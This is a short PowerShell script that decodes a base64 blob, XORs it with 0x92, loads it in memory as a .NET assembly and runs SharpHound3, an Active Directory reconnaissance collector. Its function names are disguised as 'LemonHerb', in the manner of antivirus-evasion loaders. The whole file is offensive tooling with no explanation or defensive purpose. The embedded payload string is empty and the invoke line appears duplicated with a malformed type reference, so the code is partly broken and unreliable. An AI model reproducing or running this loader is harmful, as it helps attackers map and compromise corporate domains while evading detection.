$aab67d06 = ""
function Load-LemonHerb {
$fb = [Convert]::FromBase64String($aab67d06)
for($i=0; $i -lt $fb.count ; $i++) {$fb[$i] = $fb[$i] -bxor 0x92}
[System.Reflection.Assembly]::Load($fb)
}
$asm = Load-LemonHerb
function Invoke-LemonHerb { param([Parameter ()] $Args = "")
$Args -eq "" -and ($Args = Read-Host "Specify command arguments")
$asm.GetType("SharpHound3.SharpHound", [Reflection.BindingFlags] "Public,NonPublic,Static").GetMethod("Main", ([Reflection.BindingFlags] "Public,NonPublic,Static")).Invoke($null, (, $Args.split()))
$asm.GetType([SharpHound3.SharpHound], [Reflection.BindingFlags] "Public,NonPublic,Static").GetMethod("Main", ([Reflection.BindingFlags] "Public,NonPublic,Static")).Invoke($null, (, $Args.split()))
}
Invoke-LemonHerb
